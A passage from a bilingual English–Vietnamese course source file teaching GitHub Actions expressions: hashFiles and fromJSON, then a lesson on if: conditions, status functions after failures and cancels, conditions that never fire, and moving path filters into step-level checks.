<li>Trong một kho thử, thêm một bước echo <code>hashFiles('package-lock.json')</code>, rồi một bước echo <code>hashFiles('package-loсk.json')</code> với một lỗi gõ (hoặc một đường dẫn không tồn tại). So sánh.</li>
<li>Thêm hai file và echo <code>hashFiles('a.txt', 'b.txt')</code> và <code>hashFiles('b.txt', 'a.txt')</code>; rồi <code>hashFiles('*.txt')</code>. Hai cái nào khớp?</li>
<li>Tái lập một hash ở máy bằng sáu dòng Python (SHA-256 từng file, nối các digest NHỊ PHÂN, SHA-256 kết quả) và xác nhận nó khớp log.</li>
<li>Dựng một ma trận động: job A ghi <code>echo 'ds=["x","y"]' &gt;&gt; "$GITHUB_OUTPUT"</code>, job B dùng <code>matrix: v: &#36;{{ fromJSON(needs.a.outputs.ds) }}</code>.</li></ol>
<p><strong>Đạt khi:</strong> khoá gõ sai kết thúc bằng một dấu gạch trơn; hai thứ tự nhiều-mẫu khác nhau còn glob đơn bằng thứ tự a-rồi-b; hash Python của bạn khớp; và job B chạy hai lần, mỗi giá trị ma trận một lần.</p></div>

<h3>🗂 Thuật ngữ trong bài</h3>
<div class="kv-grid">
  <div class="kv"><span class="k"><code>hashFiles(...)</code></span><span class="v">SHA-256 từng file khớp, nối dạng nhị phân, băm lại; chuỗi rỗng nếu không khớp gì. Chỉ ở mức bước.</span></div>
  <div class="kv"><span class="k"><code>fromJSON(s)</code></span><span class="v">Phân tích một chuỗi JSON thành giá trị thật: mảng, đối tượng, số hay boolean.</span></div>
  <div class="kv"><span class="k"><code>toJSON(x)</code></span><span class="v">JSON in đẹp của một giá trị; công cụ gỡ lỗi, luôn đi qua <code>env:</code>.</span></div>
  <div class="kv"><span class="k"><code>format(s, ...)</code></span><span class="v">Thay theo vị trí với <code>{0}</code>; ngoặc nhọn thật thì gấp đôi <code>{{ }}</code>.</span></div>
  <div class="kv"><span class="k"><code>contains(a, b)</code></span><span class="v">Chuỗi con nếu <code>a</code> là chuỗi, thuộc-nguyên-phần-tử nếu là mảng; không phân biệt hoa/thường.</span></div>
  <div class="kv"><span class="k"><code>case(p, v, ..., default)</code></span><span class="v">Trả giá trị cho điều kiện đúng đầu tiên; thay an toàn cho phép chọn bằng <code>&amp;&amp; ||</code>.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul>
<li>Hàm là phép tính duy nhất của ngôn ngữ biểu thức; phần lớn hiển nhiên, hai cái thì không.</li>
<li><code>hashFiles</code> băm các file khớp (nối nhị phân) và trả rỗng khi không khớp — khoá kết thúc bằng dấu gạch nghĩa là glob trượt.</li>
<li><em>Thứ tự</em> giữa các mẫu tách rời là một phần của khoá; một glob đơn thì ổn định theo thứ tự.</li>
<li><code>fromJSON</code> dựng ma trận lúc chạy và đổi chuỗi thành kiểu thật; boolean thật trong <code>inputs</code> không cần cái nào.</li>
<li><code>case()</code> chọn giá trị theo điều kiện mà không dính bẫy giá-trị-giữa-rỗng của <code>cond &amp;&amp; A || B</code>.</li>
<li><code>hashFiles</code> và các hàm trạng thái chỉ tồn tại ở những khoá mà đầu vào của chúng tồn tại — lần lượt là một bước, và <code>if:</code>.</li>
</ul>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Expressions: functions</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/expressions#functions — mọi hàm dựng sẵn kèm chữ ký chính xác, gồm cả phát biểu thuật toán <code>hashFiles</code> đã tái lập và kiểm chứng bên trên.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">actions/toolkit — phần cài đặt hashFiles</span><span class="lc-sub">github.com/actions/toolkit — mã nguồn phía runner, cho những lúc mô tả trong tài liệu để ngỏ một câu hỏi (ví dụ, phép nối là nối digest nhị phân hay chuỗi hex; câu trả lời là NHỊ PHÂN).</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Using a matrix: ma trận động với fromJSON</span><span class="lc-sub">docs.github.com/en/actions/using-jobs/using-a-matrix-for-your-jobs#using-a-matrix-from-a-job-output — khuôn mẫu output-của-job-thành-ma-trận trình bày bên trên, cách DUY NHẤT được hỗ trợ để dựng một ma trận từ dữ liệu khám phá ra.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Docker — cache theo tầng, hash nội dung, và cái gì THẬT SỰ làm mất hiệu lực</span><span class="lc-sub">/courses/docker/learn${REF} — cùng ý tưởng ấy trong một hệ dựng sống chết vì nó: một khoá cache là một LỜI KHẲNG ĐỊNH về việc một kết quả phụ thuộc vào cái gì, và lỗi tới từ lời khẳng định sai chứ không tới từ cache.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Authentication — băm, và vì sao cách mã hoá đầu vào có ý nghĩa</span><span class="lc-sub">/courses/authentication/learn${REF} — hex với nhị phân không phải chuyện vặt: băm cùng một chuỗi byte theo hai cách cho hai đáp án khác nhau, và đó đúng là câu hỏi mà phép kiểm chứng bên trên đã trả lời xong.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 3.5 ─────────────────────────── */
    {
      title: '3.5 — Conditions in practice, and the ones that never fire|||3.5 — Điều kiện trong thực tế, và những cái không bao giờ nổ',
      slug: 'ga-3-5-dieu-kien',
      type: 'VIDEO',
      description: 'Kiểm kê: cả 11 workflow chỉ có BA điều kiện `if:`. Cả ba đều đúng, và mỗi cái minh hoạ một luật khác nhau của Chương 3. Cộng bốn điều kiện phổ biến KHÔNG BAO GIỜ nổ, và cách phát hiện chúng bằng một lần chạy chứ không bằng đọc tệp.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 3 · Lesson 3.5</span>
<h2>Conditions in practice, and the ones that never fire</h2>
<p class="lead">Search all eleven workflows in this repository for <code>if:</code> and you get three results. Three conditions across 1,394 lines of YAML — which is itself the first finding, and each of the three happens to demonstrate a different rule from this chapter.</p>

<div class="out">$ grep -h "^\\s*if:" .github/workflows/*.yml
if: matrix.os == 'ubuntu-latest'
if: inputs.version != ''
if: always()

3 dieu kien / 11 workflow / 1.394 dong YAML
ca ba deu o muc BUOC, khong cai nao o muc JOB</div>

<div class="callout ok">
<p><strong>Three is a good number, and it is worth saying why.</strong> A condition is a branch, and a branch in CI is a path that is not exercised on most runs. A workflow with twenty <code>if:</code> conditions has a large number of configurations, almost all of which have never run — so the one that matters during an incident is usually one nobody has seen work. Conditions earn their place; they do not come free.</p>
</div>

<h3>The three, and what each one gets right</h3>
${slide('ga-03', 26, 'After a failed step: what each status function does')}


<p><strong>1. <code>if: matrix.os == 'ubuntu-latest'</code></strong> — on a step that installs Linux system libraries. This is the platform-specific step from Chapter 2, and lesson 2.3 measured what the condition buys: 24 seconds on Linux, and <strong>0 seconds</strong> on macOS and Windows where it is skipped. It also compares a string to a string, which 3.3 argued for.</p>

<p><strong>2. <code>if: inputs.version != ''</code></strong> — on the step that sets the package version. The explicit comparison against the empty string is doing real work here:</p>

<div class="lz-flow">
<div class="lz-step"><span class="lz-k">written this way</span><span class="lz-t"><code>inputs.version != ''</code></span><span class="lz-d">false when the input is absent; the step is skipped and the existing version stands</span></div>
<div class="lz-step"><span class="lz-k">if it had been</span><span class="lz-t"><code>if: inputs.version</code></span><span class="lz-d">would work too — an empty string is falsy — but stops working the moment somebody passes <code>'0'</code> or <code>'false'</code>, which are truthy strings</span></div>
<div class="lz-step"><span class="lz-k">what it prevents</span><span class="lz-t"><code>npm version ""</code></span><span class="lz-d">running the version command with an empty argument, which is a failure at a strange moment rather than a skip</span></div>
</div>

<p><strong>3. <code>if: always()</code></strong> — on the artifact upload. This is the case 3.3 named as the legitimate one, and the workflow file says so in its own comment: <em>if the build dies partway, whatever finished is still downloadable</em>. It uploads a file. It does not touch anything outside the run. That is exactly the boundary — <code>always()</code> is right for collecting evidence and wrong for taking action.</p>

<h3>Five conditions that misfire</h3>
${slide('ga-03', 29, 'Five dead conditions — all five run for real')}
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>if: &#36;{{ x }} == 'y'</code> — text outside the braces</span><span class="lz-lnote">(Corrected 24/09/2026. The old first item claimed <code>if: 'false'</code> runs the step; measured, it is skipped.) The real always-true case: any character outside <code>&#36;{{ }}</code> turns the value into a concatenated string, non-empty, truthy. Ran on every branch. Fix: compare as one expression, <code>x == 'y'</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: steps.x.outputs.co</code> where the output is the string <code>'false'</code></span><span class="lz-lnote">always runs. Step outputs are strings; <code>'false'</code> is non-empty, hence truthy. Fix: <code>== 'true'</code> or <code>fromJSON(...)</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: steps.abc.conclusion == 'failure'</code> on a tolerated step</span><span class="lz-lnote">never true. <code>continue-on-error</code> rewrites <code>conclusion</code> to <code>success</code>; the pre-tolerance result is <code>outcome</code>. So the reporting step you added specifically to surface tolerated failures is the one step that can never run</span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: github.ref == 'main'</code></span><span class="lz-lnote">never true. <code>github.ref</code> is <code>refs/heads/main</code>, and on a pull request it is <code>refs/pull/&lt;N&gt;/merge</code> — measured in 1.4. Use <code>github.ref_name</code> if you want the short form</span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: needs.dung.result == 'success'</code> where <code>dung</code> is not in <code>needs:</code></span><span class="lz-lnote">never true. The <code>needs</code> context only contains jobs this job declared a dependency on; anything else is empty, and <code>'' == 'success'</code> is false</span></div>
</div>

<div class="callout warn">
<p><strong>All four fail silently, and three of them fail closed.</strong> A step that never runs produces no log line saying so beyond the word "skipped" on the run page, which looks identical to a step that was <em>meant</em> to be skipped. Nothing warns you. The only reliable detection is to look at a real run and check that the steps you expected to be skipped were skipped, and the ones you expected to run ran.</p>
</div>

<h3>Status functions after a real failure, and after a cancel</h3>
${slide('ga-03', 27, 'On cancel: only always() and cancelled() still run')}
<p>The four status functions are easy to misjudge, so both branches were run for real. After a step failed on purpose (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179986" target="_blank" rel="noopener">run 36000179986</a>): the default (<code>success()</code>) and <code>if: success()</code> were skipped; <code>failure()</code>, <code>always()</code> and <code>!cancelled()</code> ran; <code>cancelled()</code> was skipped. The important corollary is on the combined line — <code>if: always() &amp;&amp; github.ref_name == 'ch03-bieu-thuc'</code> <strong>ran even though a step had failed</strong>, because any status function removes the implicit <code>success()</code>. That is almost never intended for a real action.</p>
<p>After a manual cancel (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179989" target="_blank" rel="noopener">run 36000179989</a>), a different set survives: <code>always()</code> and <code>cancelled()</code> ran, while <code>success()</code>, <code>failure()</code> and even <code>!cancelled()</code> were skipped. So <code>always()</code> runs on a cancel and <code>!cancelled()</code> does not — which is exactly why "upload logs even if cancelled" wants <code>always()</code>, and "deploy, but never on a cancelled run" wants the plain default or <code>!cancelled()</code>. And <code>always()</code> should never guard anything that reaches the outside world.</p>
<h3>The path-filter fix from 1.5, written properly</h3>
<p>Lesson 1.5 showed why <code>paths:</code> on a <code>pull_request</code> trigger blocks a required check forever, and said the fix is to move the condition inside the job. This is what that looks like:</p>

<pre><code>jobs:
  kiem:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - id: doi
        run: |
          <span class="tok-comment"># co file nao trong src/ doi khong?</span>
          if git diff --name-only origin/&#36;{{ github.base_ref }}...HEAD \\
             | grep -q '^src/'; then
            echo "co=true" &gt;&gt; \$GITHUB_OUTPUT
          else
            echo "co=false" &gt;&gt; \$GITHUB_OUTPUT
          fi

      - name: Kiem kieu
        if: steps.doi.outputs.co == 'true'
        run: npx tsc --noEmit</code></pre>

<div class="callout">
<p><strong>The job always runs, so the required check always reports.</strong> When nothing relevant changed the expensive step is skipped and the job finishes green in a few seconds, which is what branch protection needs. Note the comparison: <code>steps.doi.outputs.co == 'true'</code> against the string, because step outputs are always strings — <code>if: steps.doi.outputs.co</code> would be true for both <code>'true'</code> and <code>'false'</code>, which is 3.3&#39;s trap arriving through the back door.</p>
</div>

<div class="pitfall">
<p><strong>Trap — <code>git diff</code> in that step needs history the default checkout does not fetch.</strong> <code>actions/checkout</code> defaults to <code>fetch-depth: 1</code>: one commit, no base branch, no merge base. The diff above will fail with <code>unknown revision</code>. Either add <code>fetch-depth: 0</code> — which fetches everything, and on a large repository that is a real cost — or use an action built for this, which fetches only what it needs. This is the single most common reason a hand-written changed-files step does not work first time.</p>
</div>

<h3>Where to put a condition</h3>
${slide('ga-03', 28, 'Where to put a condition: four levels, four costs')}

<div class="kv-grid">
<div class="kv"><span class="k">on a step</span><span class="v">cheapest. The job still starts, so its check still reports; a skipped step costs 0 seconds, measured in 2.4</span></div>
<div class="kv"><span class="k">on a job</span><span class="v">skips the whole job — and remember that skips <strong>propagate</strong> to everything with <code>needs:</code> on it. A conditional job in the middle of a chain disables the rest of the chain, which is usually not the intent</span></div>
<div class="kv"><span class="k">on the trigger (<code>paths:</code>, <code>branches:</code>)</span><span class="v">cheapest of all — nothing starts — but invisible to required checks. Correct for <code>push</code>, dangerous for <code>pull_request</code></span></div>
<div class="kv"><span class="k">inside the script</span><span class="v">an <code>if</code> in bash. Fine, and sometimes clearer — but the step reports success either way, so the run page cannot show you which path was taken. Prefer the workflow-level <code>if:</code> when you want the skip to be visible</span></div>
</div>

<div class="callout ok">
<p><strong>The one sentence.</strong> Every condition adds a configuration that most runs do not exercise, so the useful discipline is to write few of them, compare strings explicitly, and verify each one against a run that shows the skip — because the file cannot tell you whether a condition works, and the run page can.</p>
</div>

<h3>Quick reference and interview questions</h3>
${slide('ga-03', 31, 'Chapter 3 quick reference table')}
<div class="callout">
<p><strong>Q: <code>if: always()</code> vs <code>if: &#36;{{ !cancelled() }}</code> — which do you use to upload logs?</strong><br>A: If you truly want the upload even when someone cancels, <code>always()</code>. If you want "run unless cancelled" (the usual intent), <code>!cancelled()</code>; it is skipped on a cancel, which is safer for anything with side effects. Both remove the implicit <code>success()</code>, so add explicit conditions if you also need success.</p>
<p><strong>Q: A required check on a PR never reports and the PR is stuck. What is the likely cause?</strong><br>A: A <code>paths:</code> filter on a <code>pull_request</code> trigger: when nothing under the paths changed, the workflow does not run at all, so the required check has no result. Fix: run the job always and move the condition inside (a step-level <code>if:</code> on the expensive step), so the check always reports.</p>
<p><strong>Q: Where is the cheapest place to skip work, and what is its downside?</strong><br>A: On the trigger (<code>paths</code>, <code>branches</code>) — nothing starts — but it is invisible to required checks. A step-level <code>if:</code> costs a job start but stays visible and reports; a job-level <code>if:</code> propagates its skip to everything that <code>needs:</code> it.</p>
</div>

<h3>🧪 Practice (20 min)</h3>
<div class="callout ok"><p><strong>Scenario:</strong> your deploy job occasionally fires after a run was cancelled, and a report step you added to catch tolerated failures never runs. You want to pin down both.</p><ol>
<li>In a test repository, add a job with a step that <code>exit 1</code>, then six steps testing <code>success()</code>, <code>failure()</code>, <code>always()</code>, <code>cancelled()</code>, <code>!cancelled()</code>, and <code>always() &amp;&amp; github.ref_name == '&lt;your-branch&gt;'</code>.</li>
<li>Add a job whose first step is <code>sleep 300</code> followed by the same six; push, cancel it after ~10s with <code>gh run cancel</code>, and read which steps ran.</li>
<li>Add a step <code>id: x</code> with <code>continue-on-error: true</code> that fails; then two steps, <code>if: steps.x.conclusion == 'failure'</code> and <code>if: steps.x.outcome == 'failure'</code>. Which fires?</li>
<li>Move a <code>paths:</code>-filtered condition from a <code>pull_request</code> trigger into a step-level <code>if:</code> and confirm the job still reports when nothing relevant changed.</li></ol>
<p><strong>Done when:</strong> you can state, from the run pages, which functions survive a failure and which survive a cancel; the <code>conclusion</code> step never fired while the <code>outcome</code> step did; and the moved condition kept the job green and reporting.</p></div>

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k"><code>success()</code></span><span class="v">The implicit default: true while nothing has failed. Writing it changes nothing.</span></div>
  <div class="kv"><span class="k"><code>failure()</code></span><span class="v">True once an earlier step or ancestor job failed.</span></div>
  <div class="kv"><span class="k"><code>always()</code></span><span class="v">True unconditionally, including after a cancel; dangerous on anything with side effects.</span></div>
  <div class="kv"><span class="k"><code>cancelled()</code> / <code>!cancelled()</code></span><span class="v">True on / false on a cancelled run; <code>!cancelled()</code> is the safer "run unless cancelled".</span></div>
  <div class="kv"><span class="k">Skip propagation</span><span class="v">A skipped or failed job marks jobs that <code>needs:</code> it as skipped down the chain.</span></div>
  <div class="kv"><span class="k">Required check invisibility</span><span class="v">A trigger-level <code>paths:</code> filter means the workflow may not run, so a required check never reports.</span></div>
</div>

<h3>📌 Summary</h3>
<ul>
<li>Any status function in a condition removes the implicit <code>success()</code>: <code>always() &amp;&amp; …</code> runs even after a failure.</li>
<li>After a failure: <code>failure()</code>, <code>always()</code>, <code>!cancelled()</code> run. After a cancel: only <code>always()</code> and <code>cancelled()</code> run.</li>
<li>Five dead/misfiring conditions, measured — the classic <code>if: 'false'</code> is not one of them; it is correctly skipped.</li>
<li>Put a condition on a step (cheap, visible, still reports), on a job (skip propagates), on the trigger (cheapest, invisible to required checks), or in bash (flexible, always green).</li>
<li>A <code>paths:</code> filter on <code>pull_request</code> can freeze a required check; move the condition into a step instead.</li>
<li>Verify every disabling condition against a run that shows the skip; the file cannot tell you it works.</li>
</ul>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Workflow syntax: jobs.&lt;id&gt;.steps[*].if</span><span class="lc-sub">docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#jobsjob_idstepsif — where <code>if:</code> is allowed, the implicit <code>success()</code>, and the note that braces are optional because the value is already an expression.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">actions/checkout — fetch-depth</span><span class="lc-sub">github.com/actions/checkout#usage — the <code>fetch-depth: 1</code> default and what <code>0</code> costs, which is the answer to the <code>git diff</code> pitfall above.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">GitHub Docs — Contexts: the steps context</span><span class="lc-sub">docs.github.com/en/actions/learn-github-actions/contexts#steps-context — the definitions of <code>outcome</code> and <code>conclusion</code> side by side, which is the clearest statement of the difference that breaks the second dead condition above.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Deploy VPS — the branch you never take is the branch that is broken</span><span class="lc-sub">/courses/deploy-vps/learn${REF} — a rollback path that had never been exercised and did not work when it was needed, and the practice of running the unusual branch on purpose before you need it.</span></span></div>
</div>
<div class="ml-vi">
<span class="eyebrow">Chương 3 · Bài 3.5</span>
<h2>Điều kiện trong thực tế, và những cái không bao giờ nổ</h2>
<p class="lead">Tìm <code>if:</code> trong cả mười một workflow của kho này thì được BA kết quả. Ba điều kiện trên 1.394 dòng YAML — bản thân điều đó đã là phát hiện thứ nhất, và mỗi cái trong ba lại tình cờ minh hoạ một luật khác nhau của chương này.</p>

<div class="out">$ grep -h "^\\s*if:" .github/workflows/*.yml
if: matrix.os == 'ubuntu-latest'
if: inputs.version != ''
if: always()

3 dieu kien / 11 workflow / 1.394 dong YAML
ca ba deu o muc BUOC, khong cai nao o muc JOB</div>

<div class="callout ok">
<p><strong>Ba là một con số tốt, và đáng nói vì sao.</strong> Một điều kiện là một NHÁNH, và một nhánh trong CI là một đường không được đi qua ở phần lớn các lần chạy. Một workflow có hai mươi điều kiện <code>if:</code> thì có một số lượng lớn cấu hình, mà gần hết chúng chưa từng chạy — nên cái có ý nghĩa trong lúc sự cố thường là cái chưa ai thấy nó hoạt động. Điều kiện phải TỰ KIẾM chỗ đứng của nó; nó không miễn phí.</p>
</div>

<h3>Ba cái đó, và mỗi cái làm đúng chuyện gì</h3>
${slide('ga-03', 26, 'Sau một bước hỏng: mỗi hàm trạng thái làm gì')}


<p><strong>1. <code>if: matrix.os == 'ubuntu-latest'</code></strong> — trên một bước cài thư viện hệ thống của Linux. Đây là bước phụ thuộc nền tảng của Chương 2, và bài 2.3 đã đo cái điều kiện ấy mua được gì: 24 giây trên Linux, và <strong>0 giây</strong> trên macOS với Windows nơi nó bị bỏ qua. Nó cũng so CHUỖI với CHUỖI, đúng thứ bài 3.3 lập luận.</p>

<p><strong>2. <code>if: inputs.version != ''</code></strong> — trên bước đặt phiên bản của gói. Phép so sánh tường minh với chuỗi rỗng ở đây đang làm việc thật:</p>

<div class="lz-flow">
<div class="lz-step"><span class="lz-k">viết như thế này</span><span class="lz-t"><code>inputs.version != ''</code></span><span class="lz-d">sai khi tham số vắng mặt; bước bị bỏ qua và phiên bản đang có được giữ nguyên</span></div>
<div class="lz-step"><span class="lz-k">nếu đã viết là</span><span class="lz-t"><code>if: inputs.version</code></span><span class="lz-d">cũng chạy được — chuỗi rỗng là SAI — nhưng thôi chạy đúng ngay khoảnh khắc có người truyền vào <code>'0'</code> hay <code>'false'</code>, những chuỗi ĐÚNG</span></div>
<div class="lz-step"><span class="lz-k">nó ngăn được gì</span><span class="lz-t"><code>npm version ""</code></span><span class="lz-d">chạy lệnh đặt phiên bản với một tham số rỗng, tức một cú hỏng ở một thời điểm kỳ quặc chứ không phải một lần bỏ qua</span></div>
</div>

<p><strong>3. <code>if: always()</code></strong> — trên bước tải artifact lên. Đây đúng là ca mà bài 3.3 gọi tên là chính đáng, và chính tệp workflow nói ra điều đó trong bình luận của nó: <em>dựng hỏng giữa chừng thì phần đã xong vẫn tải về xem được</em>. Nó TẢI MỘT TỆP LÊN. Nó không chạm vào bất cứ thứ gì ngoài lần chạy. Đó chính xác là ranh giới — <code>always()</code> đúng cho việc THU THẬP BẰNG CHỨNG và sai cho việc RA TAY HÀNH ĐỘNG.</p>

<h3>Năm điều kiện nổ sai</h3>
${slide('ga-03', 29, 'Năm điều kiện chết — cả năm đã chạy thật')}
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname"><code>if: &#36;{{ x }} == 'y'</code> — chữ nằm ngoài cặp ngoặc</span><span class="lz-lnote">(Đính chính 24/09/2026. Mục đầu cũ nói <code>if: 'false'</code> CHẠY bước; đo thật thì nó bị bỏ qua.) Ca luôn-đúng thật: bất kỳ ký tự nào ngoài <code>&#36;{{ }}</code> biến giá trị thành chuỗi ghép, khác rỗng, tức đúng. Chạy trên mọi nhánh. Vá: so cả cụm như một biểu thức, <code>x == 'y'</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: steps.x.outputs.co</code> khi output là chuỗi <code>'false'</code></span><span class="lz-lnote">luôn chạy. Output của bước là chuỗi; <code>'false'</code> khác rỗng nên đúng. Vá: <code>== 'true'</code> hoặc <code>fromJSON(...)</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: steps.abc.conclusion == 'failure'</code> trên một bước được dung thứ</span><span class="lz-lnote">không bao giờ đúng. <code>continue-on-error</code> viết lại <code>conclusion</code> thành <code>success</code>; kết quả trước-khi-dung-thứ là <code>outcome</code>. Nên cái bước báo cáo mà bạn thêm vào ĐÚNG ĐỂ phơi bày các cú hỏng được dung thứ lại chính là bước không bao giờ chạy được</span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: github.ref == 'main'</code></span><span class="lz-lnote">không bao giờ đúng. <code>github.ref</code> là <code>refs/heads/main</code>, và trên một pull request nó là <code>refs/pull/&lt;N&gt;/merge</code> — đo ở bài 1.4. Muốn dạng ngắn thì dùng <code>github.ref_name</code></span></div>
<div class="lz-layer"><span class="lz-lname"><code>if: needs.dung.result == 'success'</code> mà <code>dung</code> không có trong <code>needs:</code></span><span class="lz-lnote">không bao giờ đúng. Context <code>needs</code> chỉ chứa những job mà job này đã khai là phụ thuộc; thứ gì khác đều rỗng, và <code>'' == 'success'</code> là SAI</span></div>
</div>

<div class="callout warn">
<p><strong>Cả bốn đều hỏng ÂM THẦM, và ba trong bốn hỏng theo hướng ĐÓNG.</strong> Một bước không bao giờ chạy thì không đẻ ra dòng log nào nói vậy, ngoài chữ "skipped" trên trang lần chạy, mà chữ đó trông y hệt một bước LẼ RA phải bị bỏ qua. Không có gì cảnh báo bạn. Cách phát hiện đáng tin duy nhất là nhìn một lần chạy thật rồi kiểm xem những bước bạn mong bị bỏ qua có bị bỏ qua không, và những bước bạn mong chạy có chạy không.</p>
</div>

<h3>Hàm trạng thái sau một cú hỏng thật, và sau khi bấm huỷ</h3>
${slide('ga-03', 27, 'Bấm huỷ: chỉ always() và cancelled() còn chạy')}
<p>Bốn hàm trạng thái dễ bị đoán sai, nên cả hai nhánh đã chạy thật. Sau khi một bước cố ý hỏng (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179986" target="_blank" rel="noopener">run 36000179986</a>): mặc định (<code>success()</code>) và <code>if: success()</code> bị bỏ qua; <code>failure()</code>, <code>always()</code> và <code>!cancelled()</code> chạy; <code>cancelled()</code> bị bỏ qua. Hệ quả quan trọng nằm ở dòng kết hợp — <code>if: always() &amp;&amp; github.ref_name == 'ch03-bieu-thuc'</code> <strong>vẫn chạy dù một bước đã hỏng</strong>, vì bất kỳ hàm trạng thái nào cũng gỡ mất <code>success()</code> ngầm. Điều đó gần như không bao giờ là ý định cho một hành động thật.</p>
<p>Sau khi bấm huỷ (<a href="https://github.com/cuonghoang1103/ga-san-tap/actions/runs/36000179989" target="_blank" rel="noopener">run 36000179989</a>), một tập khác sống sót: <code>always()</code> và <code>cancelled()</code> chạy, còn <code>success()</code>, <code>failure()</code> và cả <code>!cancelled()</code> bị bỏ qua. Nên <code>always()</code> chạy khi huỷ còn <code>!cancelled()</code> thì không — chính vì thế "tải log lên kể cả khi huỷ" cần <code>always()</code>, còn "deploy nhưng đừng bao giờ trên một run bị huỷ" cần mặc định trơn hoặc <code>!cancelled()</code>. Và <code>always()</code> đừng bao giờ canh một thứ chạm ra thế giới bên ngoài.</p>
<h3>Cách vá bộ lọc đường dẫn của bài 1.5, viết cho tử tế</h3>
<p>Bài 1.5 cho thấy vì sao <code>paths:</code> trên một kích hoạt <code>pull_request</code> chặn đứng một ô kiểm bắt buộc vĩnh viễn, và nói cách vá là đưa điều kiện vào BÊN TRONG job. Nó trông như thế này:</p>

<pre><code>jobs:
  kiem:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - id: doi
        run: |
          <span class="tok-comment"># co file nao trong src/ doi khong?</span>
          if git diff --name-only origin/&#36;{{ github.base_ref }}...HEAD \\
             | grep -q '^src/'; then
            echo "co=true" &gt;&gt; \$GITHUB_OUTPUT
          else
            echo "co=false" &gt;&gt; \$GITHUB_OUTPUT
          fi

      - name: Kiem kieu
        if: steps.doi.outputs.co == 'true'
        run: npx tsc --noEmit</code></pre>

<div class="callout">
<p><strong>Job LUÔN chạy, nên ô kiểm bắt buộc LUÔN báo cáo.</strong> Khi không có gì liên quan thay đổi thì bước đắt tiền bị bỏ qua và job kết thúc xanh trong vài giây, đúng thứ branch protection cần. Để ý phép so sánh: <code>steps.doi.outputs.co == 'true'</code> so với CHUỖI, vì output của bước bao giờ cũng là chuỗi — <code>if: steps.doi.outputs.co</code> sẽ ĐÚNG cho cả <code>'true'</code> lẫn <code>'false'</code>, tức là cái bẫy của bài 3.3 quay vào bằng cửa sau.</p>
</div>

<div class="pitfall">
<p><strong>Bẫy — <code>git diff</code> trong bước ấy cần phần lịch sử mà checkout mặc định KHÔNG tải về.</strong> <code>actions/checkout</code> mặc định <code>fetch-depth: 1</code>: một commit, không có nhánh gốc, không có merge base. Câu diff bên trên sẽ hỏng với <code>unknown revision</code>. Hoặc thêm <code>fetch-depth: 0</code> — tải về tất, mà với một kho lớn thì đó là một cái giá thật — hoặc dùng một action dựng riêng cho việc này, thứ chỉ tải về đúng phần nó cần. Đây là lý do phổ biến nhất khiến một bước đếm-file-đã-đổi viết tay không chạy được ngay lần đầu.</p>
</div>

<h3>Đặt một điều kiện ở đâu</h3>
${slide('ga-03', 28, 'Đặt điều kiện ở đâu: bốn tầng, bốn cái giá')}

<div class="kv-grid">
<div class="kv"><span class="k">trên một bước</span><span class="v">rẻ nhất. Job vẫn khởi động nên ô kiểm của nó vẫn báo cáo; một bước bị bỏ qua tốn 0 giây, đo ở bài 2.4</span></div>
<div class="kv"><span class="k">trên một job</span><span class="v">bỏ qua cả job — và nhớ rằng việc bỏ qua <strong>LAN TRUYỀN</strong> sang mọi thứ có <code>needs:</code> trỏ tới nó. Một job có điều kiện nằm giữa một chuỗi sẽ vô hiệu hoá phần còn lại của chuỗi, mà đó thường không phải ý định</span></div>
<div class="kv"><span class="k">trên kích hoạt (<code>paths:</code>, <code>branches:</code>)</span><span class="v">rẻ nhất trong tất cả — không gì khởi động — nhưng VÔ HÌNH với các ô kiểm bắt buộc. Đúng cho <code>push</code>, nguy hiểm cho <code>pull_request</code></span></div>
<div class="kv"><span class="k">bên trong script</span><span class="v">một câu <code>if</code> của bash. Được, và đôi khi còn rõ hơn — nhưng bước báo cáo thành công trong cả hai trường hợp, nên trang lần chạy không cho bạn thấy đã đi đường nào. Hãy ưu tiên <code>if:</code> ở mức workflow khi bạn muốn việc bỏ qua NHÌN THẤY ĐƯỢC</span></div>
</div>

<div class="callout ok">
<p><strong>Một câu.</strong> Mỗi điều kiện thêm vào một cấu hình mà phần lớn lần chạy không đi qua, nên kỷ luật hữu ích là viết ÍT điều kiện, so sánh chuỗi một cách tường minh, và kiểm chứng từng cái bằng một lần chạy có hiện việc bỏ qua — bởi cái TỆP không nói được cho bạn biết một điều kiện có hoạt động không, còn trang lần chạy thì nói được.</p>
</div>

<h3>Bảng tra nhanh và câu hỏi phỏng vấn</h3>
${slide('ga-03', 31, 'Bảng tra nhanh Chương 3')}
<div class="callout">
